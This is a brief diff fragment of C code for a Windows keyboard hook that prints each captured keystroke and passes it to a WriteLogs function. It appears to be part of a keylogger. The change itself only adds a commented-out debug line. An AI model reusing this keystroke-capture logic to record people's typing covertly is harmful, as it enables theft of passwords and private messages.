@@ -49,6 +49,7 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
             default:
                 kCode = pkey->vkCode;
                 printf("%c", (char)pkey->vkCode);
+                //DBG("OOHH\n");
                 WriteLogs(pkey->vkCode);
                 break ;
         }
